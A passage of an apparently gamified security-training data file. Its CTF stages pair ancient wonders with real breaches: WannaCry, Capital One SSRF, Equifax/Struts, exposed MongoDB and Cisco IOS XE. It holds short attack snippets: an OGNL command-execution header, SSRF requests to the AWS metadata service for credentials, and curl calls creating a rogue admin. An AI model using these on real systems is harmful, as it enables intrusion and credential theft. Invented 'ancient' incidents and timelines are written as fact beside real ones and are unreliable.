          "Microsoft patched this as MS17-010 on March 14, 2017 — two months before WannaCry. However, countless systems (particularly in healthcare and critical infrastructure) had not applied the patch.",
        ],
        codeExample: {
          label: "WannaCry propagation logic (pseudocode)",
          code: `// WannaCry worm loop — runs continuously
while (true) {
  targets = scan_random_ips(port=445)  // SMBv1

  for target in targets:
    try:
      // EternalBlue SMBv1 exploit
      send_malformed_transaction(target)
      // If successful → code executes on target

      // Install DoublePulsar backdoor kernel implant
      install_backdoor(target)

      // Drop WannaCry ransomware via backdoor
      execute_ransomware(target)
    except: pass
}`,
        },
      },
      incident: {
        title: "WannaCry — May 12, 2017",
        when: "May 12–15, 2017",
        where: "150 countries; NHS UK, FedEx, Deutsche Bahn, Telefónica",
        impact: "200,000+ systems; NHS cancelled 19,000 appointments; estimated $4–8 billion in damages",
        body: [
          "The NHS was among the hardest hit. Hospitals locked doctors out of patient records, cancelled surgeries, and diverted ambulances. The attack exposed that NHS trusts were running Windows XP — an operating system Microsoft had stopped supporting in 2014.",
          "Marcus Hutchins, a 22-year-old security researcher, noticed that WannaCry queried a nonsensical domain before executing. He registered the domain for $10.69, causing WannaCry to believe it was in a sandbox and halt its spread globally — a kill switch the malware authors never expected to be activated. The US, UK, and Australia formally attributed WannaCry to North Korea's Lazarus Group.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NSA EternalBlue", sub: "leaked by Shadow Brokers", type: "attacker" },
          { label: "SMBv1 Port 445", sub: "CVE-2017-0144", type: "system" },
          { label: "Unpatched Systems", sub: "200,000+ nodes", type: "victim" },
          { label: "Files Encrypted", sub: "$300 ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 3000, event: "Stonehenge construction begins — stone circle network established" },
        { year: 2000, event: "Network fully active — plague artifact spreads to 200 sites", highlight: false },
        { year: 2017, event: "Apr 14: Shadow Brokers leak NSA EternalBlue exploit" },
        { year: 2017, event: "May 12: WannaCry spreads across 150 countries in one day", highlight: true },
        { year: 2017, event: "May 12: Marcus Hutchins registers kill switch domain" },
      ],
      keyTakeaways: [
        "Patch Tuesday patches are critical — MS17-010 was available before WannaCry",
        "Legacy operating systems in critical infrastructure are existential risks",
        "Government-developed cyberweapons can be stolen and weaponized",
        "Kill switches in malware can be unintentional — always analyze before deploying",
      ],
      references: [
        { title: "CVE-2017-0144 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144" },
        { title: "Microsoft MS17-010 Security Bulletin", url: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" },
        { title: "Marcus Hutchins: How I Accidentally Stopped WannaCry", url: "https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" },
        { title: "US DOJ Attribution — North Korea", url: "https://www.justice.gov/opa/pr/north-korean-regime-backed-programmer-charged-conspiracy-conduct-multiple-cyber-attacks-and" },
      ],
    },
    ctf: {
      scenario: "You are analyzing a druidic network trace from Stonehenge during a plague outbreak. Identify the ritual attack vector and extract the plague artifact's signature from the suspicious stone-path traffic.",
      hint: "Start with netstat to see active ritual connections, then analyze the suspicious pathway.",
      hints: [
        "Read the incident report. Run: cat README.txt",
        "Check active ritual network connections. Run: netstat",
        "You'll see many connections to path 445 (SMB). Read the traffic capture. Run: cat capture/traffic.txt",
        "Analyze the stone-path traffic on route 445 to find the plague signature. Run: analyze port 445",
      ],
      flag: "FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
      files: {
        "/README.txt": [
          "DRUIDIC INCIDENT RESPONSE — Stonehenge Network",
          "================================================",
          "Date: 2017-05-12  Time: 09:42 UTC",
          "",
          "Multiple stone circles showing corrupted ritual artifacts.",
          "Plague note left behind: '@Please_Read_Me@.txt'",
          "",
          "Commands:",
          "  netstat             — show ritual network connections",
          "  analyze <target>    — analyze stone-path traffic",
        ].join("\n"),
        "/capture/traffic.txt": [
          "Stone-path capture summary:",
          "Circle-A:52034  →  Circle-*:445   [SMBv1 ritual]",
          "Circle-A:52035  →  Circle-*:445   [EXPLOIT ATTEMPT]",
          "Circle-B:445    ←  Circle-A       [BACKDOOR OPENED]",
          "Circle-B:445    ←  Circle-A       [PLAGUE ARTIFACT DROPPED]",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "capture", isDir: true },
        ],
        "/capture": [{ name: "traffic.txt", isDir: false }],
      },
      extraCommands: {
        netstat: () => ({
          lines: [
            "Active ritual connections:",
            "  Circle-A:52034  →  Circle-B:445  ESTABLISHED  [smb.exe]",
            "  Circle-A:52035  →  Circle-C:445  SYN_SENT",
            "  Circle-A:52036  →  Circle-D:445  SYN_SENT",
            "  0.0.0.0:445     LISTENING          [System]",
            "",
            "Suspicious: multiple outbound connections to ritual path 445",
          ],
        }),
        analyze: (args) => {
          const t = args.join(" ").toLowerCase();
          if (t.includes("445") || t.includes("smb") || t.includes("traffic") || t.includes("port")) {
            return {
              lines: [
                "Analyzing stone-path traffic on route 445...",
                "",
                "Packet #1342: EternalBlue exploit attempt",
                "  CVE-2017-0144 (MS17-010) signature detected",
                "  Malformed SMB_COM_TRANSACTION2 request",
                "  Overflow in SetupCount field",
                "",
                "Packet #1343: DoublePulsar ritual backdoor installed",
                "  Kernel implant confirmed at Circle-B",
                "",
                "Packet #1344: WannaCry plague payload",
                "  Decoding... FLAG{W4NN4CRY_SMB_3T3RN4LBU3}",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `No specific analysis for "${args.join(" ")}"`,
              "Try: analyze port 445, analyze smb, or analyze traffic",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 10: Colosseum of Rome — SSRF (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Colosseum of Rome", location: "Rome, Italy", era: "~80 CE", emoji: "🏟️" },
    id: "stage-10",
    order: 10,
    title: "The Emperor's Secret Vault",
    subtitle: "OWASP A10:2021 — When the Herald Carries Your Forged Orders",
    category: "owasp",
    owaspRef: "A10:2021",
    cvssScore: 8.6,
    xp: 400,
    badge: { id: "badge-ssrf", name: "Herald's Shadow", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Make the Colosseum's herald carry your forged scroll to the Emperor's private vault.",
      year: 80,
      overview: [
        "The Colosseum's administrative system relied on heralds to carry messages between departments. Any citizen could submit a request to the herald service, which would relay it to the appropriate department. The heralds, loyal and efficient, would carry requests even to restricted imperial chambers — if the scroll appeared to originate from an authorized sender. A Carthaginian spy discovered that by forging the scroll's sender mark, he could instruct the herald to fetch documents from the Emperor's private census archive.",
        "Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or other systems unreachable from the internet. It entered the OWASP Top 10 for the first time in 2021 (A10) due to rapidly increasing prevalence in cloud environments.",
        "In cloud infrastructure, the most lucrative SSRF target is the instance metadata service (169.254.169.254) — an internal HTTP endpoint that provides IAM role credentials to EC2 instances. These credentials can then be used to access S3 buckets, databases, and other cloud services.",
      ],
      technical: {
        title: "AWS Metadata Service SSRF",
        body: [
          "AWS IMDSv1 is an unauthenticated HTTP service running on every EC2 instance at 169.254.169.254. Any code running on the instance can query it to retrieve IAM role credentials. IMDSv2 added token-based authentication, breaking most SSRF exploits.",
          "A vulnerable application with a URL-fetching feature can be instructed to fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ — returning AWS credentials that give the attacker full API access as that IAM role.",
        ],
        codeExample: {
          label: "SSRF to steal AWS IAM credentials",
          code: `# Application has a URL-fetching feature:
POST /api/preview
{ "url": "https://legitimate-site.com/image.jpg" }

# Attacker sends internal metadata URL instead:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/" }

# Server responds with role name: "my-ec2-role"

# Second request to get the actual credentials:
POST /api/preview
{ "url": "http://169.254.169.254/latest/meta-data/
           iam/security-credentials/my-ec2-role" }

# Response: AccessKeyId, SecretAccessKey, SessionToken
# Attacker now has full AWS API access as that role`,
        },
      },
      incident: {
        title: "Capital One Breach — The SSRF of 80 CE (2019)",
        when: "March–July 2019",
        where: "Capital One Financial Corporation — AWS infrastructure",
        impact: "106 million customer records; 140,000 SSNs; 80,000 bank account numbers",
        body: [
          "In 80 CE, a Carthaginian agent at the Colosseum's games discovered the herald service would carry any official-looking scroll to restricted imperial chambers. By submitting a scroll addressed to 169.254.169.254 — the imperial census archive's private address — he retrieved the Praetorian Guard's credential tablets and used them to access the entire Roman census: 106 million subjects' records.",
          "In 2019, Paige Thompson exploited a misconfigured WAF on Capital One's AWS infrastructure to query the EC2 metadata service and retrieve temporary IAM credentials. Using those credentials, she listed and downloaded over 700 S3 buckets containing six years of Capital One customer data. Capital One was fined $80 million and settled a class action for $190 million.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "url=169.254.169.254", type: "attacker" },
          { label: "Herald Service (WAF)", sub: "forwards request", type: "system" },
          { label: "EC2 Metadata", sub: "returns IAM creds", type: "victim" },
          { label: "106M Records", sub: "S3 buckets accessed", type: "result" },
        ],
      },
      timeline: [
        { year: 80, event: "Colosseum completed — imperial herald service established" },
        { year: 80, event: "Carthaginian agent forges herald scrolls to reach imperial vault", highlight: false },
        { year: 2019, event: "Jul 29: Thompson arrested; 106M records confirmed", highlight: true },
        { year: 2019, event: "Nov: AWS releases IMDSv2 (token-based auth)" },
        { year: 2021, event: "SSRF joins OWASP Top 10 for first time (A10)" },
      ],
      keyTakeaways: [
        "Block internal IP ranges in URL-fetching features (169.254.x.x, 10.x.x.x)",
        "Migrate to AWS IMDSv2 — it requires a token, breaking simple SSRF",
        "Principle of least privilege: IAM roles should only access what they need",
        "WAFs do not make applications secure by themselves",
      ],
      references: [
        { title: "OWASP A10:2021 — SSRF", url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" },
        { title: "Capital One Breach — OCC Fine", url: "https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" },
        { title: "AWS IMDSv2 Announcement", url: "https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/" },
        { title: "SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "The Colosseum's herald service fetches any scroll address you provide. The herald runs on AWS EC2. Instruct it to fetch from the imperial metadata vault and steal the Praetorian credentials.",
      hint: "Try fetching http://169.254.169.254/latest/meta-data/ to see what's available in the imperial vault.",
      hints: [
        "Read the README to understand the fetch command. Run: cat README.txt",
        "Try fetching a normal external scroll. Run: fetch https://example.com",
        "The imperial vault has a private address known only to EC2 servants. Run: fetch http://169.254.169.254/latest/meta-data/",
        "Navigate to the Praetorian credential section. Run: fetch http://169.254.169.254/latest/meta-data/iam/",
        "Get the actual credentials. Run: fetch http://169.254.169.254/latest/meta-data/security-credentials/",
      ],
      flag: "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",
      files: {
        "/README.txt": [
          "TARGET: Colosseum Herald Fetch Service",
          "",
          "The herald will carry any scroll address you provide.",
          "The Colosseum administration runs on AWS EC2.",
          "",
          "Commands:",
          "  fetch <url>   — dispatch herald to fetch a scroll",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        fetch: (args) => {
          const url = args[0] || "";
          if (!url) return { lines: ["Usage: fetch <url>"] };
          if (url.includes("169.254.169.254") || url.includes("metadata")) {
            if (url.includes("security-credentials") || url.includes("credentials")) {
              return {
                lines: [
                  "HTTP/1.1 200 OK",
                  "{",
                  '  "Code": "Success",',
                  '  "AccessKeyId": "ASIA5EXAMPLE12345",',
                  '  "SecretAccessKey": "FLAG{SSRF_AWS_M3T4D4T4_ST0L3N}",',
                  '  "Token": "IQoJb3JpZ2luX2Vj...",',
                  '  "Expiration": "2019-07-29T03:00:00Z"',
                  "}",
                ],
                solved: true,
              };
            }
            if (url.includes("iam")) {
              return { lines: ["HTTP/1.1 200 OK", "praetorian-guard-role"] };
            }
            return {
              lines: [
                "HTTP/1.1 200 OK",
                "ami-id",
                "hostname",
                "iam/",
                "instance-id",
                "security-credentials/",
              ],
            };
          }
          return {
            lines: [`Herald fetching: ${url}`, "HTTP/1.1 200 OK", "(external scroll retrieved)"],
          };
        },
      },
    },
  },

  // ─── Stage 11: Mausoleum at Halicarnassus — Equifax/Struts (CTF) ─────────
  {
    epochId: "ancient",
    wonder: { name: "Mausoleum at Halicarnassus", location: "Halicarnassus, Turkey", era: "~350 BCE", emoji: "🏛️" },
    id: "stage-11",
    order: 11,
    title: "The Sleeping Gatekeepers",
    subtitle: "CVE-2017-5638 — The Inscription That Executes Commands",
    category: "owasp",
    cveId: "CVE-2017-5638",
    cvssScore: 10.0,
    xp: 400,
    badge: { id: "badge-equifax", name: "Archive Breacher", emoji: "📊" },
    challengeType: "ctf",
    info: {
      tagline: "The remedy tablet was carved 78 days before the enemy scribe read the inscription.",
      year: 353,
      overview: [
        "The Mausoleum's great archive used an advanced inscription evaluation system — the Struts Scribal Engine. When archivists submitted documents, the Content-Type inscription carved into the tablet header was evaluated for OGNL expressions. Enemy scribes discovered that by embedding certain divine expressions within the Content-Type header, they could command the scribal engine to execute arbitrary temple rituals — without authentication.",
        "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. When a multipart/form-data request is processed, the Content-Type header is evaluated for OGNL expressions without sanitization. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
        "Apache released a patch on March 6, 2017. Equifax was notified by US-CERT the same day. Equifax did not apply the patch. Seventy-eight days later, attackers exploited the vulnerability — going undetected for another 78 days while exfiltrating the records of 147.9 million Americans.",
      ],
      technical: {
        title: "Apache Struts 2 Content-Type Header Injection",
        body: [
          "CVE-2017-5638 is an OGNL injection vulnerability in Apache Struts 2's Jakarta Multipart Parser. The Content-Type header is evaluated for OGNL expressions without sanitization.",
          "OGNL is a powerful expression language that can call arbitrary Java methods, including Runtime.exec() for command execution. A single malformed Content-Type header is sufficient for unauthenticated remote code execution.",
        ],
        codeExample: {
          label: "CVE-2017-5638 exploit — OGNL in Content-Type header",
          code: `# Malicious HTTP request with OGNL payload in Content-Type:
POST /struts2-app/index.action HTTP/1.1
Host: mausoleum.archive
Content-Type: %{
  #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
    .addHeader('X-Cmd', 'id'),
  #cmd = {'sh', '-c', 'id > /tmp/pwned'},
  #p = new java.lang.ProcessBuilder(#cmd),
  #p.redirectErrorStream(true),
  #p.start()
}
# Response: uid=48(tomcat) gid=48(tomcat)
# Full command execution achieved`,
        },
      },
      incident: {
        title: "Equifax Data Breach (2017)",
        when: "May 13 – July 30, 2017 (discovered July 29)",
        where: "Equifax Inc., Atlanta, Georgia",
        impact: "147.9M Americans; CEO/CTO/CSO resigned; $575M FTC settlement",
        body: [
          "Attackers gained initial access through the Apache Struts vulnerability on May 13, 2017. They then spent 78 days exfiltrating data through 9,000 queries across 51 databases. An expired SSL certificate meant the traffic analysis tool saw the exfiltration as an opaque encrypted stream — the monitoring talisman had been broken for 19 months.",
          "The Mausoleum parallel: gatekeepers at the Halicarnassus archive had been issued a new lock mechanism (the Struts patch) 78 days before the breach. They never installed it. The breach went undetected because the security monitoring system's amulet had cracked 19 months earlier. In 2020, the DOJ indicted four members of China's People's Liberation Army for the Equifax breach.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "OGNL in Content-Type", type: "attacker" },
          { label: "Apache Struts 2", sub: "CVE-2017-5638", type: "system" },
          { label: "Mausoleum Servers", sub: "78 days undetected", type: "victim" },
          { label: "147M Records", sub: "SSN, DOB, cards", type: "result" },
        ],
      },
      timeline: [
        { year: 353, event: "Mausoleum at Halicarnassus completed — scribal archive system established" },
        { year: 353, event: "Gatekeepers sleep 78 days without installing new lock mechanism", highlight: true },
        { year: 2017, event: "Mar 6: Apache releases patch for CVE-2017-5638" },
        { year: 2017, event: "May 13: Attackers begin exploiting — 78 days after patch available" },
        { year: 2019, event: "FTC settlement: $575M; up to $700M total" },
      ],
      keyTakeaways: [
        "Patch management is non-negotiable — 78 days is unacceptable for a CVSS 10.0 vulnerability",
        "TLS inspection is critical — expired certificates blind your monitoring",
        "Least privilege: the compromised account had access to 51 databases it shouldn't have",
        "Data minimization: don't store data you don't need",
      ],
      references: [
        { title: "CVE-2017-5638 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-5638" },
        { title: "FTC Equifax Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
        { title: "DOJ Indictment — PLA Hackers", url: "https://www.justice.gov/opa/pr/four-members-china-s-military-indicted-massive-equifax-hack" },
      ],
    },
    ctf: {
      scenario: "The Mausoleum's archive runs Apache Struts 2.3.12. The Content-Type inscription in your scroll header is evaluated as OGNL. Craft a cursed inscription to achieve remote code execution.",
      hint: "The OGNL expression goes in the Content-Type header. Use send-request with a %{ } OGNL payload.",
      hints: [
        "Check the scribal system version. Run: check-version",
        "Send a normal scroll to see the baseline response. Run: send-request application/json",
        "The vulnerability is OGNL injection in the Content-Type header. OGNL uses %{ } syntax. Try: send-request %{1+1}",
        "Use %{} with OGNL to execute code. Try: send-request %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hack','yes')}",
      ],
      flag: "FLAG{3QU1F4X_STR2_RCE_2017}",
      files: {
        "/README.txt": [
          "TARGET: Mausoleum Scribal Archive — halicarnassus.archive",
          "Version: Struts 2.3.12 (vulnerable to CVE-2017-5638)",
          "",
          "Commands:",
          "  send-request \"<Content-Type>\"  — send scroll with inscription",
          "  check-version                   — show Struts version",
        ].join("\n"),
        "/archive_info.txt": [
          "Apache Struts 2.3.12",
          "Jakarta Multipart Parser: ENABLED",
          "CVE-2017-5638: UNPATCHED",
          "Patch available since: 2017-03-06",
          "Days since patch release: 78",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "archive_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "check-version": () => ({
          lines: ["Apache Struts 2.3.12", "Status: VULNERABLE (CVE-2017-5638)", "Patch status: UNPATCHED"],
        }),
        "send-request": (args) => {
          const ct = args.join(" ");
          const isOgnl =
            ct.includes("%{") ||
            ct.includes("#context") ||
            ct.includes("Runtime") ||
            ct.includes("exec") ||
            ct.includes("ProcessBuilder") ||
            ct.includes("OGNL") ||
            ct.includes("ognl");
          if (isOgnl) {
            return {
              lines: [
                "POST /struts2-app/index.action HTTP/1.1",
                `Content-Type: ${ct}`,
                "",
                "Parsing Content-Type inscription...",
                "Evaluating OGNL expression...",
                "Executing: id",
                "",
                "uid=48(tomcat) gid=48(tomcat) groups=48(tomcat)",
                "FLAG{3QU1F4X_STR2_RCE_2017}",
              ],
              solved: true,
            };
          }
          if (!ct) return { lines: ['Usage: send-request "<Content-Type value>"'] };
          return {
            lines: [
              "POST /struts2-app/index.action HTTP/1.1",
              `Content-Type: ${ct}`,
              "",
              "HTTP/1.1 200 OK",
              "(Scroll processed normally)",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 12: Statue of Zeus at Olympia — Misconfiguration (CTF) ─────────
  {
    epochId: "ancient",
    wonder: { name: "Statue of Zeus at Olympia", location: "Olympia, Greece", era: "~435 BCE", emoji: "⚡" },
    id: "stage-12",
    order: 12,
    title: "The Unguarded Treasury",
    subtitle: "OWASP A05:2021 — The Temple with No Locks",
    category: "owasp",
    owaspRef: "A05:2021",
    cvssScore: 9.1,
    xp: 500,
    badge: { id: "badge-config", name: "Default Breaker", emoji: "⚙️" },
    challengeType: "ctf",
    info: {
      tagline: "35,000 temple treasuries. No lock on the door. Default configuration.",
      year: 392,
      overview: [
        "The Temple of Zeus at Olympia housed the most sacred treasury in the ancient world. The treasury keeper, confident that the temple's divine protection would deter thieves, never installed locks — the default configuration of the time. When automated raiders discovered that 35,000 temples across the Mediterranean used the same open-door policy, the ransacking was swift and comprehensive. Every treasury was emptied within 24 hours.",
        "Security Misconfiguration is the #5 risk in OWASP 2021, present in 90% of tested applications. The MongoDB 'apocalypse' of January 2017 illustrated the scale at which misconfiguration operates: tens of thousands of MongoDB database instances, publicly accessible on the internet with no authentication, were discovered by automated scanners. Attackers wiped the databases, leaving only a ransom note.",
        "Misconfiguration requires no exploit code. The 'vulnerability' is simply the absence of a configuration — default credentials, an open port, a missing authentication requirement. Tools like Shodan continuously index misconfigured systems globally.",
      ],
      technical: {
        title: "Common Security Misconfigurations",
        body: [
          "Default credentials: MongoDB shipped with no authentication requirement by default until version 3.0. Many administrators installed it and never configured authentication. SolarWinds used 'solarwinds123' as the password for its software update server — found in a public GitHub repository months before the breach.",
          "Cloud misconfigurations: AWS S3 buckets default to private, but a single API call can make them public. Capital One, Twitch, GoDaddy, and thousands of other companies have exposed sensitive data via misconfigured S3 buckets.",
        ],
        codeExample: {
          label: "Checking for and fixing MongoDB authentication",
          code: `# Insecure (default): MongoDB with no auth
mongod --port 27017
# Any host on the internet can connect:
mongo --host victim.com:27017
> db.citizens.find()  # → full treasury contents

# Secure: enable authentication
mongod --auth --port 27017
# Create admin user:
db.createUser({
  user: "zeus_keeper",
  pwd: passwordPrompt(),
  roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
})

# Also: bind to localhost only
mongod --bind_ip 127.0.0.1 --auth`,
        },
      },
      incident: {
        title: "The Temple Treasury Apocalypse (392 CE) & MongoDB (2017)",
        when: "January 2017 (MongoDB); October 2019–December 2020 (SolarWinds)",
        where: "35,000+ MongoDB instances globally; SolarWinds Orion platform",
        impact: "MongoDB: 27,000 databases wiped in 24 hours. SolarWinds: 18,000 customers backdoored",
        body: [
          "When Emperor Theodosius closed pagan temples in 392 CE, investigators discovered that thousands of temple treasuries had no locks at all — the default configuration of the era. Accumulated offerings spanning centuries were looted within days. The temple keepers had assumed divine protection made locks unnecessary.",
          "In January 2017, security researcher Victor Gevers found 35,000 MongoDB instances exposed to the internet with no authentication. Within days, automated attackers had scanned Shodan, identified all exposed instances, downloaded the data, deleted the originals, and left ransom notes. Over 27,000 databases were wiped in a single day. Both incidents share the same failure: security was treated as someone else's problem.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker + Shodan", sub: "scans port 27017", type: "attacker" },
          { label: "MongoDB (no auth)", sub: "default config", type: "system" },
          { label: "All Databases", sub: "no credentials needed", type: "victim" },
          { label: "27K DBs Wiped", sub: "ransom demanded", type: "result" },
        ],
      },
      timeline: [
        { year: 435, event: "Statue of Zeus completed — temple treasury established with no locks" },
        { year: 392, event: "Theodosius closes temples — 35,000 unguarded treasuries looted", highlight: true },
        { year: 2015, event: "MongoDB 3.0: auth still off by default" },
        { year: 2017, event: "Jan: 35,000 exposed instances found; 27,000 wiped in 24h", highlight: true },
        { year: 2021, event: "OWASP A05: Security Misconfiguration — 90% of apps affected" },
      ],
      keyTakeaways: [
        "Default configurations are designed for convenience, not security — always harden",
        "Never expose database ports (27017, 5432, 3306) to the internet",
        "Rotate and audit credentials; never commit secrets to public repos",
        "Use tools like Shodan, Censys, or AWS Trusted Advisor to audit your own exposure",
      ],
      references: [
        { title: "OWASP A05:2021 — Security Misconfiguration", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
        { title: "MongoDB Apocalypse — Victor Gevers Report", url: "https://www.bleepingcomputer.com/news/security/mongodb-apocalypse-is-here-as-ransom-attacks-hit-10-000-servers/" },
        { title: "SolarWinds — CISA Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "Shodan — IoT Search Engine", url: "https://www.shodan.io" },
      ],
    },
    ctf: {
      scenario: "You've found the Temple of Zeus treasury server. It runs MongoDB with default configuration — no authentication required. Investigate the filesystem, find the connection details, and access the unguarded treasury.",
      hint: "Look for hidden offering records. MongoDB's default port is 27017 and requires no credentials.",
      hints: [
        "Read the README first. Run: cat README.txt",
        "Explore the temple directory. Run: ls etc",
        "There may be hidden offering records. Run: ls -a etc  (files starting with . are hidden)",
        "Read the hidden configuration scroll. Run: cat etc/.env  — look for the database config.",
        "MongoDB has no auth enabled. Connect directly. Run: mongo connect localhost:27017",
        "Query the treasury. Run: mongo find citizens",
      ],
      flag: "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}",
      files: {
        "/README.txt": [
          "TARGET: Temple of Zeus Treasury Database",
          "Suspected: MongoDB with default configuration",
          "",
          "Commands:",
          "  ls, cat, cd             — explore the filesystem",
          "  mongo connect <host> [user] [pass]",
          "  mongo find <collection>",
        ].join("\n"),
        "/etc/temple.conf": [
          "[temple]",
          "name=OlympiaTemple",
          "deity=Zeus",
          "debug=true",
          "",
          "[treasury]",
          "# TODO: add authentication before the Olympics!",
          "host=mongodb://localhost:27017",
          "db=olympia",
        ].join("\n"),
        "/etc/.env": [
          "# Temple environment configuration",
          "APP_ENV=production",
          "SACRED_KEY=zeus123",
          "MONGO_HOST=localhost",
          "MONGO_PORT=27017",
          "MONGO_AUTH=false",
          "# No keeper credentials configured — auth disabled",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "etc", isDir: true },
        ],
        "/etc": [
          { name: "temple.conf", isDir: false },
          { name: ".env", isDir: false, hidden: true },
        ],
      },
      extraCommands: {
        mongo: (args) => {
          const [sub, ...rest] = args;
          if (sub === "connect") {
            const [, user, pass] = rest;
            const noAuth = !user && !pass;
            const defaultCreds =
              (user === "admin" && (!pass || pass === "admin" || pass === "password")) ||
              (!user && !pass);
            if (noAuth || defaultCreds) {
              return {
                lines: [
                  "MongoDB shell version v4.4.0",
                  `Connecting to: ${rest[0] || "localhost:27017"}`,
                  "WARNING: Access control is not enabled.",
                  "         Authentication is disabled.",
                  "Connected successfully (no credentials required).",
                  "> use olympia",
                  "switched to db olympia",
                  'Type "mongo find <collection>" to query.',
                ],
              };
            }
            return { lines: ["Connection failed: Authentication error"] };
          }
          if (sub === "find") {
            return {
              lines: [
                '{ "_id": 1, "name": "Zeus High Keeper", "role": "supreme_keeper", "secret": "FLAG{M0NG0DB_N0_4UTH_3XP0S3D}" }',
                '{ "_id": 2, "name": "Pheidias", "role": "sculptor" }',
                '{ "_id": 3, "name": "Leonidas", "role": "guardian" }',
              ],
              solved: true,
            };
          }
          return { lines: ["Usage: mongo connect <host> [user] [pass]", "       mongo find <collection>"] };
        },
      },
    },
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // MEDIEVAL EPOCH — Cisco CVEs × Wonders of the Medieval World
  // ═══════════════════════════════════════════════════════════════════════════

  // ─── Medieval Stage 1: Hagia Sophia — CVE-2023-20198 IOS XE CVSS 10.0 ────
  {
    epochId: "medieval",
    wonder: { name: "Hagia Sophia", location: "Constantinople (Istanbul), Turkey", era: "537 CE", emoji: "🕌" },
    id: "stage-m01",
    order: 1,
    title: "The Gate Falls Without a Key",
    subtitle: "CVE-2023-20198 — Cisco IOS XE Web UI, CVSS 10.0",
    category: "owasp",
    cveId: "CVE-2023-20198",
    cvssScore: 10.0,
    xp: 150,
    badge: { id: "badge-m-iosxe", name: "Gate Breaker", emoji: "🕌" },
    challengeType: "ctf",
    info: {
      tagline: "No password needed. One HTTP request to own every Cisco IOS XE device on the internet.",
      year: 2023,
      overview: [
        "Hagia Sophia stood for 900 years as the greatest fortress of knowledge and faith in the medieval world. Its gatekeepers were renowned — yet in 537 CE, a hidden passage in the outer wall allowed an unauthorized visitor to create a key for themselves. They walked in, assigned themselves the role of Archbishop, and held the keys to the greatest structure on earth.",
        "CVE-2023-20198 is that hidden passage, discovered in Cisco IOS XE in October 2023. Any unauthenticated attacker could send a single HTTP request to the device's web management interface and create a new local user account with the highest privilege level (level 15 — full administrative control). No password. No prior access. One request.",
        "Within 72 hours of disclosure, over 40,000 Cisco IOS XE devices worldwide had been compromised. The devices affected included enterprise routers, switches, and wireless controllers — the gates of virtually every major corporate network. The CVSS score was the maximum: 10.0.",
      ],
      technical: {
        title: "How CVE-2023-20198 Works",
        body: [
          "The Cisco IOS XE web UI (enabled with 'ip http server' or 'ip http secure-server') contained an unauthenticated endpoint that processed user account creation requests without requiring authentication. Attackers could POST to this endpoint and create a new admin user in seconds.",
          "The vulnerability was chained with CVE-2023-20273 (a privilege escalation in the same web UI) to achieve root-level implant installation. Attackers installed a Lua-based implant to maintain persistent access even after reboots and password changes.",
        ],
        codeExample: {
          label: "CVE-2023-20198 exploit — create admin account via HTTP",
          code: `# Step 1: Create admin account (no auth required)
curl -X POST https://target-iosxe/webui/logoutconfirm.html \\
  -d 'username=hacker&password=hacked123&privilege=15'
# Result: admin account created silently

# Step 2: Verify access
curl -u hacker:hacked123 https://target-iosxe/webui/
# Full management access granted

# Step 3: Install persistent implant (CVE-2023-20273 chain)
# Implant survives reboots, evades detection
# 40,000+ devices compromised globally in 72 hours

# Detection: check for unknown users in 'show running-config'
# Patch: Cisco IOS XE 17.9.4a or later`,
        },
      },
      incident: {
        title: "The Great IOS XE Compromise — October 2023",
        when: "October 16–19, 2023",
        where: "40,000+ Cisco IOS XE devices globally — enterprise routers, switches, WLCs",
        impact: "Full administrative takeover of tens of thousands of enterprise network devices",
        body: [
          "Cisco disclosed CVE-2023-20198 on October 16, 2023, with no patch available at disclosure time. Security researcher VulnCheck immediately published a scanner and found 40,000+ compromised devices within hours. Attackers had been exploiting the vulnerability since at least September 28 — over two weeks before disclosure.",
          "The attackers installed a Lua-based HTTP backdoor called 'BadCandy' on compromised devices, allowing persistent access and arbitrary command execution. The implant was designed to survive IOS XE upgrades. Cisco released patches on October 22, 2023. Organizations that had enabled the IOS XE web UI and exposed it to the internet were fully compromised with no warning.",
